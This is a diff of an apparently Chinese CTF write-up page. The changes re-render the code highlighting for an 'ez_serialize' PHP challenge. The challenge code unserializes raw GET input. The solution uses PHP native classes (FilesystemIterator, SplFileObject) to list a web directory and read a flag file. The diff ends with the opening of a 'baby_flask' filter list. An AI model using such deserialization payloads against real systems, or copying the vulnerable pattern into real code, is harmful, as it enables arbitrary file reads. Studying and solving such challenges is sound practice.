@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      735 字
+      694 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      12
        分钟
     </span>
   
@@ -254,59 +254,59 @@
             
             <div class="markdown-body">
               <h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>利用原生类，扫描，读取文件        </p>
-<pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
-error_reporting(<span class="hljs-number">0</span>);
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
-    <span class="hljs-keyword">public</span> $class;
-    <span class="hljs-keyword">public</span> $para;
-    <span class="hljs-keyword">public</span> $check;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;class = <span class="hljs-string">&quot;B&quot;</span>;
-        <span class="hljs-keyword">$this</span>-&gt;para = <span class="hljs-string">&quot;ctfer&quot;</span>;
-        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-keyword">$this</span>-&gt;class (<span class="hljs-keyword">$this</span>-&gt;para);
-    &#125;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;check = <span class="hljs-keyword">new</span> C;
-        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;check-&gt;vaild(<span class="hljs-keyword">$this</span>-&gt;para) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;check-&gt;vaild(<span class="hljs-keyword">$this</span>-&gt;class)) &#123;
-            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-keyword">$this</span>-&gt;class (<span class="hljs-keyword">$this</span>-&gt;para);
-        &#125;
-        <span class="hljs-keyword">else</span>
-            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad hacker~&#x27;</span>);
-    &#125;
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"B"</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"ctfer"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token keyword">new</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token keyword">new</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'bad hacker~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;
-    <span class="hljs-keyword">var</span> $a;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;a = $a;
-        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;hello &quot;</span>.<span class="hljs-keyword">$this</span>-&gt;a);
-    &#125;
-&#125;
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"hello "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">&#123;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vaild</span>(<span class="hljs-params">$code</span>)</span>&#123;
-        $pattern = <span class="hljs-string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;
-        <span class="hljs-keyword">if</span> (preg_match($pattern, $code))&#123;
-            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
-        &#125;
-        <span class="hljs-keyword">else</span>
-            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
-    &#125;
-&#125;
+    <span class="token keyword">function</span> <span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span>
+            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
 
 
-<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;
-    unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-    $a=<span class="hljs-keyword">new</span> A;
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>
 
-&#125;</code></pre></code></pre>
+<span class="token punctuation">&#125;</span> </span></code></pre></code></pre>
 <p>初看平平无奇，也没啥危险函数，利用原生类了       </p>
 <pre><code>    public function __wakeup()
     &#123;
@@ -318,27 +318,27 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
             die(&#39;bad hacker~&#39;);
     &#125;        </code></pre>
 <p><img src="https://sc02.alicdn.com/kf/U9a1978f1ecdb43efb14e616b95cca88eP.jpg" srcset="/img/loading.gif" alt="01.png">        </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
-    <span class="hljs-keyword">public</span> $class=<span class="hljs-string">&#x27;FilesystemIterator&#x27;</span>;
-    <span class="hljs-keyword">public</span> $para=<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>;
-    <span class="hljs-keyword">public</span> $check;
-&#125;
-$a=<span class="hljs-keyword">new</span> A();
-<span class="hljs-keyword">echo</span> serialize($a);
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token operator">=</span><span class="token single-quoted-string string">'FilesystemIterator'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token operator">=</span><span class="token single-quoted-string string">'/var/www/html/'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+<span class="token delimiter important">?></span></span></code></pre></code></pre>
 <p>得到一个文件夹，然后再遍历这个文件夹，得到一个<code>flag.php</code><br>(这里用Diretorylterator的话，我在本地返回的是一个点）<br>读取文件       </p>
-<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
-    <span class="hljs-keyword">public</span> $class=<span class="hljs-string">&#x27;SplFileObject&#x27;</span>;
-    <span class="hljs-keyword">public</span> $para=<span class="hljs-string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;
-    <span class="hljs-keyword">public</span> $check;
-    &#125;
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token operator">=</span><span class="token single-quoted-string string">'SplFileObject'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token operator">=</span><span class="token double-quoted-string string">"/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-$o  = <span class="hljs-keyword">new</span> A();
-<span class="hljs-keyword">echo</span> serialize($o);
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+<span class="token variable">$o</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span></code></pre></code></pre>
 <h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><p>过滤的东西        </p>
 <pre><code>blacklist&lt;/br&gt;   
 &#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
